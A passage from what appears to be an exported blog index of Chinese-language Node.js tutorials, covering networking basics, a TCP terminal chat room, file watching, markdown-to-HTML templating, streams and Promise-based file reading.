之上的一个模块，该模块遵循的 http 协议 会对收发的数据进行 协议格式解析和包装 HTTP 协议只是适用于B/S模型 有的业务功能使用的是别的协议 例如 一些智能终端，就用的是别的协议，而不是 HTTP 但是他们都是基于最基本的 Socket 网络编程模型而构建的 浏览器的本质 Socket 客户端 收发数据 渲染 HTML、CSS 解析和执行 JavaScript 代码]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node-网络编程-终端聊天室]]></title>
    <url>%2F2017%2F01%2F01%2FNode-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B-%E7%BB%88%E7%AB%AF%E8%81%8A%E5%A4%A9%E5%AE%A4%2F</url>
    <content type="text"><![CDATA[网络编程 应用层 http 协议 在浏览器输入一个地址，浏览器按照 http 协议将输入的地址包装成 http 报文 和数据传输没有任何关系 只负责数据包装 包装目的就是为了区分不同的行为 传输层 将应用层包装好的数据，通过传输层进行传输 TCP: 电话机 端到端通信协议，必须知道对方的 ip 地址和端口号 TCP/IP 对数据传输有一定的完整性的保障 一旦传输过程发生数据的完整性丢失，则全部丢掉重传 三次握手连接 双方通信必须先建立连接 确保双方都能收到对方的消息 首先呢，有两个概念 客户端 发送一个请求 –&gt; 再回一个 这就是三次握手连接 服务器 回送一个消息 建立三次握手连接之后双方就可以进行有保证的数据通信了 用于 web 服务器 和 客户端浏览器 传输数据 数据安全性，对数据完整性有要求的使用 TCP/IP 协议 UDP: 收音机 广播 发送一条数据，谁收到我不关心 例如游戏、在线听歌、看电影 都是使用 UDP 协议 对于数据的完整性没有保证 网络层 路由定位 IP 寻址 和 路由定位 链路层 “链接层”的功能，它在 “实体层” 的上方，确定了 0 和 1 的分组方式 对要传输的数据，把 0 和 1 进行分组，分成多个数据块进行传输 实体层 光缆、电缆、双绞线、无线电液 高电频、低电频 在终端模拟聊天室服务端模拟123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960const net = require('net');const server = net.createServer();// 用户昵称: socket对象// 用户昵称: socket对象// ......const users = &#123;&#125;;server.on('connection', socket =&gt; &#123; // 当收到客户端的注册消息的时候，处理注册请求 // 可能昵称被占用了，你就要告诉用户被占用了 // 如果没有被占用，则将昵称保存起来，告诉用户登陆聊天室成功 // 叶良辰 // \list // 我有一百种方法让你待不下去 // 赵日天: 你等着 socket.json = obj =&gt; &#123; socket.write(JSON.stringify(obj)); &#125; socket.on('data', data =&gt; &#123; data = data.toString().trim(); try &#123; data = JSON.parse(data); switch (data.type) &#123; case 'signup': // 如果昵称已存在，则告诉用户昵称已存在 if (users[data.message]) &#123; return socket.write(JSON.stringify(&#123; type: 'singup', code: 1001, message: 'nickname already exists' &#125;)); &#125; // 将昵称保存到数据对象中 users[data.message] = socket; // 给客户端响应消息，告诉客户端登陆成功 socket.write(JSON.stringify(&#123; type: 'singup', code: 1000, nickname: data.message, message: 'success', &#125;)); break; case 'broadcast': for (let nickname in users) &#123; users[nickname].json(&#123; type: 'broadcast', from: data.from, message: data.message &#125;); &#125; break; default: break; &#125; &#125; catch (e) &#123; &#125; &#125;)&#125;)server.listen(10000, '192.168.32.96', () =&gt; &#123; console.log('server is running at port 3000')&#125;); 客户端模拟1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586const net = require('net');const socket = net.createConnection(3000, '192.168.32.96');socket.json = obj =&gt; &#123; socket.write(JSON.stringify(obj));&#125;;// 这个变量用来保存用户的昵称同时也作为一个标记let nickname;socket.on('connect', () =&gt; &#123; process.stdout.write('请输入你的昵称：'); process.stdin.on('data', data =&gt; &#123; data = data.toString().trim(); if (!nickname) &#123; const send = &#123; type: 'signup', message: data, &#125;; // 将 json 对象转为字符串就叫做序列化 // 将 json 格式字符串转为对象叫做反序列化 return socket.write(JSON.stringify(send)); &#125; // 把所有这种指令型的都加上一个 \ 用来区分 // \help if (data === '\\list') &#123; return socket.json(&#123; type: 'list'; &#125;); &#125; // 如果用户输入的 xxx:dsadsadsa // 就包装成点对点聊天数据格式 const matches = /^(.+):(.+)$/.exec(data) if (matches) &#123; return socket.json(&#123; type: 'p2p', from: nickname, to: matches[1], message: matches[2] &#125;); &#125; socket.json(&#123; type: 'broadcast', from: nickname, message: data &#125;); &#125;);&#125;);socket.on('data', data =&gt; &#123; // 客户端也要根据服务器响应的消息做一个处理 // 例如，当服务器发送了一个被占用的消息的时候，客户端就提示用户请重新输入 // 当服务器发送一个登陆成功的时候，客户端也提示用户 data = data.toString().trim(); try &#123; data = JSON.parse(data); switch (data.type) &#123; case 'singup': switch (data.code) &#123; case 1000: console.log('恭喜，登陆聊天室成功'); nickname = data.nickname; break; case 1001: console.log('昵称已被占用，大侠请重新来过'); process.stdout.write('请输入你的昵称：'); break; default: break; &#125; break; case 'broadcast': console.log(`$&#123;data.from&#125;说：$&#123;data.message&#125;`); break; case 'list': console.log(''); console.log('================ 用户列表 ================'); data.message.forEach(n =&gt; console.log(n)); console.log('=========================================='); console.log(''); break case 'p2p': console.log(`$&#123;data.from&#125;对你说：$&#123;data.message&#125;`); break; default: break; &#125; &#125; catch (e) &#123; &#125;&#125;);]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node-文件操作（下）- 文件监视、markdown转换器]]></title>
    <url>%2F2016%2F12%2F26%2FNode-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%EF%BC%88%E4%B8%8B%EF%BC%89-%20%E6%96%87%E4%BB%B6%E7%9B%91%E8%A7%86%E3%80%81markdown%E8%BD%AC%E6%8D%A2%E5%99%A8%2F</url>
    <content type="text"><![CDATA[监视文件监视 API fs.watchFile() 回调函数中需要接收两个参数 第一个是当前文件的最新状态 stat， 第二个是变化之前的 stat 123456const fs = require('fs');// 监视文件的修改时间fs.watchFile('./node.md', (curr, prev) =&gt; &#123; console.log(curr.mtime.getHours() + ':' + curr.mtime.getMinutes() + ':' +curr.mtime.getSeconds()); console.log(prev.mtime.getHours() + ':' + prev.mtime.getMinutes() + ':' +prev.mtime.getSeconds());&#125;); 使用模板引擎时需要注意的地方 1234567891011const template = require('art-template');// 1. 调用 template.compile 方法，传入一个模板字符串，得到一个渲染函数// # 表示不编码输出const render = template.compile(`&lt;h1&gt;&#123;&#123;# title &#125;&#125;&lt;/h1&gt;`);// 防止用户恶意注入 JavaScript 代码const result = render(&#123; title: '&lt;span&gt;hello&lt;/span&gt;'&#125;);console.log(result); 在 node 中使用模板引擎 1234567891011121314151617const template = require('art-template');// 这是 art-template 的简洁语法const render = template.compile(` &lt;h1&gt;&#123;&#123;title&#125;&#125;&lt;/h1&gt; &lt;ul&gt; &#123;&#123;each list as value i&#125;&#125; &lt;li&gt;索引&#123;&#123;i&#125;&#125;:&#123;&#123;value&#125;&#125;&lt;/li&gt; &#123;&#123;/each&#125;&#125; &lt;/ul&gt;`);const result = render(&#123; title: 'node 中使用模板引擎', list: [ 'a', 'b', 'c' ]&#125;);console.log(result); 以上这段代码的模板是手写到代码中的，我们可以通过文件读取的方式获得模板 正真想用原生语法，就需要加载另一个native 文件，修改的入口文件： art-tempalte 文件下的package.json, main:”./node/template-native.js” 1234567891011121314const template = require('art-template');// 这是 art-template 的原生语法const render = template.compile(` &lt;h1&gt;&lt;%= title %&gt;&lt;/h1&gt; &lt;ul&gt; &lt;/ul&gt;`);const result = render(&#123; title: 'node 中使用模板引擎', list: [ 'a', 'b', 'c' ]&#125;);console.log(result); 模板字符串 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style type=""&gt;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;&#123;&#123; title &#125;&#125;&lt;/h1&gt; &lt;article class="markdown-body"&gt; &#123;&#123;# body &#125;&#125; &lt;/article&gt;&lt;/body&gt;&lt;/html&gt; markdown 文件自动生成 HTML12345678910111213141516171819202122232425262728293031const fs = require('fs');const marked = require('marked');const template = require('art-template');// &#123; persistent: true, interval: 1000 &#125; 修改间隔时间fs.watchFile('./node.md', &#123; persistent: true, interval: 1000 &#125;, (curr, prev) =&gt; &#123; fs.readFile('./node.md', (err, md) =&gt; &#123; if (err) &#123; throw err; &#125; // 拿到文件数据，将 Markdown 格式字符串转换为 HTML 格式字符串 const htmlStr = marked(md.toString()); fs.readFile('./template.html', 'utf8', (err, tmp) =&gt; &#123; if (err) &#123; throw err; &#125; // 使用 art-template 模板引擎编译解析 const result = template.compile(tmp)(&#123; textTitle: 'node 学习', title: 'node 学习', body: htmlStr, &#125;); // 写入要生成的文件中 fs.writeFile('./node.html', result, err =&gt; &#123; if (err) &#123; throw err; &#125; console.log('translate success'); &#125;); &#125;); &#125;);&#125;); 最后， art-template 模板既可以在浏览器中使用还可以在 node 中使用，注意： node 中使用时，看 node-modules 文件下 art-template 文件下的 package.json 文件，该文件中的 main 属性就是 node 使用 art-template 模板所使用包的路径。 在浏览器中使用时，引入的 art-template 包是 dist 目录下的 art-template.js 文件。 读 execl 文件123456789101112131415161718const parseXlsx = require('excel');const moment = require('moment');parseXlsx('./data/课表.xlsx', (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; // 解析 excel 表格日期 // var date = new Date((42628 - (25567 + 1)) * 86400 * 1000) // // 在原有日期 - 1 天 // date = moment(date).add(-1, 'days').format('YYYY-MM-DD')) for (let day of data) &#123; if (day[1].trim().length &gt; 0) &#123; if (day[1].includes('周淑刚')) &#123; console.log(moment(new Date((parseInt(day[0]) - (25567 + 1)) * 86400 * 1000)).add(-1, 'days').format('YYYY-MM-DD'), day[1]) &#125; &#125; &#125;&#125;) 文件流读取大文件，使用流的方式 1234567891011121314151617181920212223242526const fs= require('fs');const src = '';const des = '';// 创建一个可读流// 2. 创建一个可写流// 3. 更新可毒瘤对象的 data 事件// 只要流对象已经过创建成功，先一瓢一瓢的读取数据// 当读取到一定数据的时候，触发 data 事件， 同时将数据传递给回调函数// 只要度去掉一个点数据，就调用可写流对象的 write 方法，将数据写入到可写流中// 4. 监听可读流对象的 end 事件// 当以流的形式读取数据之后，会触发可读流对象的 end 事件// 使用可写流的 end 方法将可写流关闭const readStream = fs.createReadStream(src);const writeStream = fs.createWriteStream(des);// 获取要读取文件的总字节大小const totalSize = fs.statSync(src).size;// 用来统计最新读取到的数据字节数const currentSize = 0;readStream.on('data', data =&gt; &#123; console.log(`$&#123;((currentSize += data.length) / totalSize * 100).toFixed(2)&#125;%10`); writeStream.write(data);&#125;);readStream.on('end', () =&gt; &#123; console.log('复制文结束'); writeStream.end();&#125;); 使用管道方法读写大文件； 123456789101112131415const readStream = fs.createReadStrean(src);const writeStream = fs.createWriteStream(des);const fs= require('fs');const src = '';const des = '';// 获取要读取文件的总字节大小const totalSize = fs.statSync(src).size;// 用来统计最新读取到的数据字节数const currentSize = 0;readStream.on('data', data =&gt; &#123; console.log(`$&#123;((currentSize += data.length) / totalSize * 100).toFixed(2)&#125;%10`); writeStream.write(data);&#125;);// 将可读流通过 pipe 方法，数据自动流入指定的可写流中readStream.pipe(writeStream); 涉及的包 moment：时间处理 fs-extra：扩展了原生 fs 模块的功能，例如删除一个非空目录，递归遍历无极目录等 marked：Markdown转换 art-template：模板引擎 excel：读取excel表格文件数据 nodemon: 监听文件变化，自动重启 npm install -g nodemon nodemon server.js 该工具会监听文件的变化，使用 node 重新执行对应的脚本文件]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node-文件操作（中）- 文件状态、promise版本封装]]></title>
    <url>%2F2016%2F12%2F08%2FNode-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%EF%BC%88%E4%B8%AD%EF%BC%89-%20%E6%96%87%E4%BB%B6%E7%8A%B6%E6%80%81%E3%80%81promise%E7%89%88%E6%9C%AC%E5%B0%81%E8%A3%85%2F</url>
    <content type="text"><![CDATA[获取文件信息12const fs = require('fs');fs.stat(path,callback); 文件目录readdir 只能读取一级目录 1. readdir 方法初步使用123456789101112131415161718const fs = require('fs');const path = require('path');fs.readdir(rootDir, (err, data) =&gt; &#123; if (err) &#123; throw err; &#125; for(let name of files) &#123; const tmpPath = path.join(rootDir, name); fs.stat(tmpPath, (err, stats) =&gt; &#123; if (err) &#123; throw err; &#125; if (stats.isFile() &amp;&amp; path.extname(tmpPath) === '.cmd') &#123; console.log(tempPath); &#125; &#125;); &#125;&#125;); 2. 把 1 的代码封装成一个方法，得到一个目录下所有后缀名的文件1234567891011121314151617181920212223242526272829303132333435const fs = require('fs');const path = require('path');const rootDir = './data';getPathsByFilter(rootDir, '.txt', (err, paths) =&gt; &#123; if (err) &#123; throw err; &#125; console.log(paths);&#125;);// 封装成一个方法，得到一个目录下所有后缀名的文件function getPathsByFilter(rootDir, extName, callback) &#123; fs.readdir(rootDir, (err, files) =&gt; &#123; if (err) &#123; return callback(err); &#125; const paths = []; let count = 0; for(let name of files) &#123; const tmpPath = path.join(rootDir, name); fs.stat(tmpPath, (err, stats) =&gt; &#123; if (err) &#123; return callback(err); &#125; if (stats.isFile() &amp;&amp; path.extname(tmpPath) === extName) &#123; paths.push(tmpPath); &#125; count++; if (count === files.length) &#123; callback(null, paths); &#125; &#125;); &#125; &#125;);&#125; 3. 把 2 代码块得到的所有文件都读出来12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455const fs = require('fs');const path = require('path');const rootDir = './data';getPathsByFilter(rootDir, '.txt', (err, paths) =&gt; &#123; if (err) &#123; throw err; &#125; // 读文件 Promise.all(paths.map(p =&gt; readFile(p))) .then(data =&gt; &#123; data.forEach(d =&gt; console.log(d.toString())); &#125;) .catch(err =&gt; &#123; throw err; &#125;);&#125;);// 封装成一个方法，得到一个目录下所有后缀名的文件function getPathsByFilter(rootDir, extName, callback) &#123; fs.readdir(rootDir, (err, files) =&gt; &#123; if (err) &#123; return callback(err); &#125; const paths = []; let count = 0; for(let name of files) &#123; const tmpPath = path.join(rootDir, name); fs.stat(tmpPath, (err, stats) =&gt; &#123; if (err) &#123; return callback(err); &#125; if (stats.isFile() &amp;&amp; path.extname(tmpPath) === extName) &#123; paths.push(tmpPath); &#125; count++; if (count === files.length) &#123; callback(null, paths); &#125; &#125;); &#125; &#125;);&#125;// 读文件的方法function readFile(filePath) &#123; return new Promise((resolve, reject) =&gt; &#123; fs.readFile(filePath, (err, data) =&gt; &#123; if (err) &#123; return reject(err); &#125; resolve(data); &#125;); &#125;);&#125; 这样封装的 getPathsByFilter() 方法不是好的 API，要用 Promise， 都封装成 Promise 版本 4. 把 3 代码优化1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253const fs = require('fs');const path = require('path');const rootDir = './data';getPathsByFilter(rootDir, '.txt').then(paths =&gt; &#123; return Promise.all(paths.map(p =&gt; readFile(p)))&#125;).then(data =&gt; &#123; data.forEach(d =&gt; console.log(d.toString()));&#125;).catch(err =&gt; &#123; throw err;&#125;);// 封装成一个方法，得到一个目录下所有后缀名的文件function getPathsByFilter(rootDir, extName) &#123; return new Promise((resolve, reject) =&gt; &#123; fs.readdir(rootDir, (err, files) =&gt; &#123; if (err) &#123; return reject(err); &#125; const paths = []; let count = 0; for(let name of files) &#123; const tmpPath = path.join(rootDir, name); fs.stat(tmpPath, (err, stats) =&gt; &#123; if (err) &#123; return reject(err); &#125; if (stats.isFile() &amp;&amp; path.extname(tmpPath) === extName) &#123; paths.push(tmpPath); &#125; count++; if (count === files.length) &#123; resolve(paths); &#125; &#125;); &#125; &#125;); &#125;);&#125;// 读文件的方法function readFile(filePath) &#123; return new Promise((resolve, reject) =&gt; &#123; fs.readFile(filePath, (err, data) =&gt; &#123; if (err) &#123; return reject(err); &#125; resolve(data); &#125;); &#125;);&#125; 5. 终极 promise 版本的指定文件目录，读取指定后缀名的所有文件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677const fs = require('fs');const path = require('path');const rootDir = './data';getPathsByFilter(rootDir, '.txt') .then(paths =&gt; &#123; return Promise.all(paths.map(p =&gt; readFile(p))) &#125;) .then(data =&gt; &#123; data.forEach(d =&gt; console.log(d.toString())) &#125;) .catch(err =&gt; &#123; throw err &#125;)function getPathsByFilter(rootDir, extName) &#123; return new Promise((resolve, reject) =&gt; &#123; readdir(rootDir).then(files =&gt; &#123; const paths = [] let count = 0 for (let name of files) &#123; const tmpPath = path.join(rootDir, name) stat(tmpPath).then(stats =&gt; &#123; // 判断是否是文件并且后缀名是指定的 .txt if (stats.isFile() &amp;&amp; path.extname(tmpPath) === extName) &#123; paths.push(tmpPath) &#125; count++ if (count === files.length) &#123; resolve(paths) &#125; &#125;) .catch(err =&gt; &#123; // 主动在当前代码块抛出异常 Promise.reject(err) &#125;) &#125; &#125;) .catch(err =&gt; &#123; reject(err) &#125;) &#125;)&#125;// 文件目录操作function readdir(dir) &#123; return new Promise((resolve, reject) =&gt; &#123; fs.readdir(dir, (err, files) =&gt; &#123; if (err) &#123; return reject(err) &#125; resolve(files) &#125;) &#125;)&#125;// 读文件的方法function readFile(filePath) &#123; return new Promise((resolve, reject) =&gt; &#123; fs.readFile(filePath, (err, data) =&gt; &#123; if (err) &#123; return reject(err) &#125; resolve(data) &#125;) &#125;)&#125;// 获取文件状态function stat(filePath) &#123; return new Promise((resolve, reject) =&gt; &#123; fs.stat(filePath, (err, stats) =&gt; &#123; if (err) &#123; return reject(err) &#125; resolve(stats) &#125;) &#125;)&#125;]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node-promise对象]]></title>
    <url>%2F2016%2F11%2F22%2FNode-promise%E5%AF%B9%E8%B1%A1%2F</url>
    <content type="text"><![CDATA[一个 promise 在在代码中体现出来就是一个对象，该对象一般保存一个异步执行的任务。 Promise是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大。它由社区最早提出和实现，ES6将其写进了语言标准，统一了用法，原生提供了 Promise 对象。表示是一个未来的事情，可能做到，也可能失败。 Promise，简单说就是一个容器，里面保存着某个未来才会结束的事件（通常是一个异步操作）的结果。 Promise 对象从语法上说，Promise是一个对象，从它可以获取异步操作的结果。 Promise对象代表一个异步操作，有三种状态： Pending（进行中） Resolved（已完成，又称Fulfilled） Rejected（已失败） 只有异步操作的结果，可以决定当前是哪一种状态。 有了Promise对象，就可以将异步操作以同步操作的流程表达出来，避免了层层嵌套的回调函数。此外，Promise对象提供统一的接口，使得控制异步操作更加容易。 一个读文件的例子: 123456789101112131415161718192021222324const fs = require('fs');// Promise 对象容器中一般放置一个异步执行的任务// 就是封装一个异步执行的 APIconst p = new Promise((resolve, reject) =&gt; &#123; console.log('Promise 容器执行了'); fs.readFile('./es6.md', 'utf8', (err, data) =&gt; &#123; if (err) &#123; // 容器中异步任务失败之后，就调用容器的 Promise 对象的 reject 方法； // 将错误对象传递给 regect 方法 return reject(err); &#125; // 容器中异步任务成功之后，就调用 Promise 容器中的 resolve 方法， // 将结果传递给 resolve 方法 resolve(data); &#125;);&#125;);// 当 Promise 对象一经创建就会立即执行// 可以通过 Promise 容器对象的任何方法接收 容器中 resolve 传递的结果值// then 方法需要接收一个回调函数，该回调函数是 Promise 容器中的 resolvep.then(data =&gt; &#123; console.log(data);&#125;, err =&gt; &#123; console.log('读取文件失败了');&#125;); 解决异步调用问题1234567891011121314151617181920212223242526272829303132333435363738394041424344const fs = require('fs');const p1 = new Promise((resolve, reject) =&gt; &#123; fs.readFile('./data/01.txt', 'utf8', (err, data) =&gt; &#123; if (err) &#123; return reject(err); &#125; resolve(data); &#125;);&#125;);const p2 = new Promise((resolve, reject) =&gt; &#123; fs.readFile('./data/02.txt', 'utf8', (err, data) =&gt; &#123; if (err) &#123; return reject(err); &#125; resolve(data); &#125;);&#125;);const p3 = new Promise((resolve, reject) =&gt; &#123; fs.readFile('./data/03.txt', 'utf8', (err, data) =&gt; &#123; if (err) &#123; return reject(err); &#125; resolve(data); &#125;);&#125;);p1.then(data =&gt; &#123; console.log(data); return p2;&#125;).then(data =&gt; &#123; // 当前这个 then 里面的回调函数的参数，就是上一个 then 中回调函数的返回值 // 该返回值有 3 种情况， // 1， 没有返回值就是 undefined // 2. 手动的 return 普通值 // 3. 返回一个新的 Promise 对象 // 如果是 Promise 对象，那么当前 then 就是 该 Promise 对象 resolve 函数的结果 console.log(data); return p3;&#125;).then(data =&gt; &#123; console.log(data);&#125;).catch(err =&gt; &#123; // 当前这个catch 方法就可以把之前所有的任务中可能出现的异常都捕获 // 甚至包括 then 函数中的异常也可以捕获到 console.log(err);&#125;); 封装 Promise 版本的读取文件方法。 1234567891011121314151617181920212223242526const fs = require('fs');function readFile(filePath, encoding) &#123; return new Promise((resolve, reject) =&gt; &#123; fs.readFile(filePath, encoding, (err, data) =&gt; &#123; if (err) &#123; return reject(err); &#125; resolve(data); &#125;); &#125;);&#125;readFile('./data/01.txt', 'utf8').then(data =&gt; &#123; console.log(data); return readFile('./data/02.txt', 'utf8');&#125;).then(data =&gt; &#123; console.log(data); return readFile('./data/03.txt', 'utf8');&#125;).then(data =&gt; &#123; console.log(data);&#125;).catch(err =&gt;&#123; console.log(err);&#125;); 封装 Promise 版本的读写文件方法。 12345678910111213141516171819202122232425262728293031const fs = require('fs');function readFile(filePath) &#123; return new Promise((resolve, reject) =&gt; &#123; fs.readFile(filePath, (err, data) =&gt; &#123; if (err) &#123; return reject(err); &#125; resolve(data); &#125;); &#125;);&#125;function writeFile(filePath, data) &#123; return new Promise((resolve, reject) =&gt; &#123; fs.writeFile(filePath, data, err =&gt; &#123; if (err) &#123; return reject(err); &#125; resolve(); &#125;); &#125;);&#125;readFile('./data/01.txt').then(data =&gt; &#123; return writeFile('./data/01copy.txt', data);&#125;).then(() =&gt; &#123; console.log(write success);&#125;).catch(err =&gt;&#123; console.log(err);&#125;); 基本使用Promise.all()Promise.all方法用于将多个Promise实例，包装成一个新的Promise实例。 1234var p = Promise.all([p1, p2, p3]);p.then(data =&gt; &#123; console.log(data); // data 是一个数组&#125;) Promise.all方法接受一个数组作为参数，p1、p2、p3都是Promise对象的实例。 p的状态由p1、p2、p3决定，分成两种情况： 只有p1、p2、p3的状态都变成fulfilled ，p的状态才会变成fulfilled 此时p1、p2、p3的返回值组成一个数组，传递给p的回调函数。 只要p1、p2、p3之中有一个被rejected，p的状态就变成rejected 此时第一个被reject的实例的返回值，会传递给p的回调函数。封装异步并行读取文件 Promise 的另外一个版本 1234567891011121314151617181920212223const fs = require('fs');function readFile(filePath) &#123; return new Promise((resolve, reject) =&gt; &#123; fs.readFile(filePath, (err, data) =&gt; &#123; if (err) &#123; return reject(err); &#125; resolve(data); &#125;); &#125;);&#125;// Promise 构造函数的 all() 方法接收一个每个元素都是 Promise 对象的数组// 返回结果也是 Promise 对象// Promise 专门用来解决回调地狱的，也可以做异步流程控制Promise.all([ readFile('./data/01.txt'), readFile('./data/02.txt'), readFile('./data/03.txt')]).then(data =&gt; &#123; console.log(data[0].toString()); console.log(data[1].toString()); console.log(data[2].toString());&#125;); 以读文件为例子，封装 Promise API：1234567891011121314151617181920212223242526272829const fs = require('fs');function readFile(filePath) &#123; return new Promise((resolve, reject) =&gt; &#123; fs.readFile(filePath, (err, data) =&gt; &#123; if (err) &#123; return reject(err); &#125; resolve(data); &#125;); &#125;);&#125;// 提供一个方法，该方法接收一个数组，数组中的指定要读取的文件路径，个数不定// 当所有文件读取到的时候，将读取到的所有文件的结果返回// getAll(['./data/01.txt', './data/02.txt', './data/03.txt']).then().catch()function getAll(filePaths) &#123; return Promise.all(filePaths.map(filePath =&gt; readFile(filePath)));&#125;getAll([ './data/01.txt', './data/02.txt', './data/03.txt']).then(data =&gt; &#123; console.log(data[0].toString()); console.log(data[1].toString()); console.log(data[2].toString());&#125;).catch(err =&gt; &#123; console.log('读取文件失败');&#125;); Promise.race()Promise.race方法同样是将多个Promise实例，包装成一个新的Promise实例。 1var p = Promise.race([p1,p2,p3]); 上面代码中，只要p1、p2、p3之中有一个实例率先改变状态，p的状态就跟着改变。那个率先改变的Promise实例的返回值，就传递给p的回调函数。 并行执行一系列的异步任务，只要有一个异步任务完成，那业务就完成。 12345678910111213141516const fs = require('fs');function readFile(filePath) &#123; return new Promise((resolve, reject) =&gt; &#123; fs.readFile(filePath, (err, data) =&gt; &#123; if (err) &#123; return reject(err); &#125; resolve(data); &#125;); &#125;);&#125;// 谁先完成得到谁的数据Promise.race([readFile('./data/01.txt'), readFile('./data/02.txt')]).then(data =&gt; &#123; console.log(data.toString());&#125;)]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node-文件操作（上）-简单封装复制文件方法、process对象]]></title>
    <url>%2F2016%2F11%2F11%2FNode-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%EF%BC%88%E4%B8%8A%EF%BC%89-%E7%AE%80%E5%8D%95%E5%B0%81%E8%A3%85%E5%A4%8D%E5%88%B6%E6%96%87%E4%BB%B6%E6%96%B9%E6%B3%95%E3%80%81process%E5%AF%B9%E8%B1%A1%2F</url>
    <content type="text"><![CDATA[fs 文件操作模块 Node 只在文件 IO 操作中，提供了同步调用和异步调用两种形式，fs 模块对文件的几乎所有操作都有同步和异步两种形式，两者可以结合使用，但是推荐能使用异步调用解决问题的情况下，少用同步调用。 例如：readFile() 和 readFileSync()。 引入包1const path = require('path'); 同步操作 同步代码会阻塞后续代码执行，效率低 同步 API 需要 try-catch 捕获异常 同步 API 优点代码符合思维逻辑， 按顺序执行，简单执行 1234567const fs = require('fs');try &#123; const data = fs.readFileSync('./README.md', 'utf8'); console.log(data);&#125; catch(e)&#123; console.log('读取文件失败');&#125; 同步读取文件的一个例子 12345678910const fs = require('fs');try &#123; const data1 = fs.readFileSync('./01.txt', 'utf8'); const data2 = fs.readFileSync('./02.txt', 'utf8'); const data2 = fs.readFileSync('./03.txt', 'utf8'); console.log('已完成所有数据的读取'); console.log(data1, data2, data3);&#125; catch(e)&#123; console.log('读取文件失败');&#125; 异步操作异步 API 往往伴随着一个回调函数用来接收，返回值或异常处理。 回调函数的参数中第一个参数一般都是一个 err 对象，用来判定异步 API 是否发生异常。 异步 API 即便没有捕获异常也不会主动抛出异常 异步 API，无法通过 try-catch 捕获异常 一般文件操作中，所有的异步 API，都会在回调函数中提供一个 error 对象 如果操作过程中有异常，则 error 是一个异常对象 如果操作成功，没有问题，则 error 是一个 null 所以，为了判定是否有异常，if (err) {// 处理异常} 1234567const fs = require('fs');fs.readFile("./data/01.txt","utf8", (err, data1) =&gt; &#123; if (err) &#123; return console.log("失败了"); &#125; console.log(data1);&#125;); 异步操作中： 开发阶段，使用 throw err 的形式抛出异常 目的是为了快速的定位代码的错误 如果是网站服务器中，这个就不会去 throw err， 一般会有异常处理机制 一般在生产环境，会处理异常，例如记录日志方便排查错误 throw err 会直接抛出异常，退出进程 一个例子1234567891011121314151617181920212223242526272829303132const fs = require('fs');// 开始做某一件事console.log("做一件事");console.log("需要准备一些做这件事的必备品");console.log("找人帮我买必备品\n\n");// 所有的异步任务都会等待其它的同步代码执行结束之后，才会开始执行fs.readFile("./data/01.txt", "utf8", (err, data1) =&gt; &#123; if (err) &#123; throw err; &#125; console.log("11111111---", data1); fs.readFile("./data/02.txt", "utf8", (err, data2) =&gt; &#123; if (err) &#123; throw err; &#125; console.log("222222-----", data2); fs.readFile("./data/03.txt", "utf8", (err, data3) =&gt; &#123; if (err) &#123; throw err; &#125; console.log("3333----", data3); // 器材备齐，可以做事了 doSomething (data1, data2, data3); &#125;); &#125;);&#125;);console.log("先干点别的活");console.log("然后去睡一会");console.log("收拾收拾准备");function doSomething(data1, data2, data3) &#123; console.log("ok, 器材已经准备齐全，可以做这件事了");&#125; 封装准备器材的这个过程；123456789101112131415161718192021222324252627const fs = require('fs');// 上面代码的封装function ready(doSomething)&#123; fs.readFile("./data/01.txt", "utf8", (err, data1) =&gt; &#123; if (err) &#123; throw err; &#125; console.log("11111111---", data1); fs.readFile("./data/02.txt", "utf8", (err, data2) =&gt; &#123; if (err) &#123; throw err; &#125; console.log("222222-----", data2); fs.readFile("./data/03.txt", "utf8", (err, data3) =&gt; &#123; if (err) &#123; throw err; &#125; console.log("3333----", data3); // 器材备齐，可以做事了 doSomething (data1, data2, data3); &#125;); &#125;); &#125;);&#125;ready((data1, data2, data3) =&gt; &#123; console.log("ok, 器材已经准备齐全，可以做这件事了");&#125;); 修改封装中的异常处理方式12345678910111213141516171819202122232425262728293031const fs = require('fs');// 上面代码的封装function ready(doSomething)&#123; fs.readFile("./data/01.txt", "utf8", (err, data1) =&gt; &#123; if (err) &#123; return doSomething(err); &#125; console.log("11111111---", data1); fs.readFile("./data/02.txt", "utf8", (err, data2) =&gt; &#123; if (err) &#123; return doSomething(err); &#125; console.log("222222-----", data2); fs.readFile("./data/03.txt", "utf8", (err, data3) =&gt; &#123; if (err) &#123; return doSomething(err); &#125; console.log("3333----", data3); // 不发生错误时，第一个参数传递一个 null doSomething (null, data1, data2, data3); &#125;); &#125;); &#125;);&#125;// 封装过后处理错误的过程ready((err, data1, data2, data3) =&gt; &#123; if (err) &#123; throw err; &#125; console.log("ok, 器材已经准备齐全，可以做这件事了");&#125;); 封装多个异步并行任务找多个人去做准备工作 123456789101112131415161718192021222324252627282930313233343536const fs = require('fs');// 上面代码的封装let count = 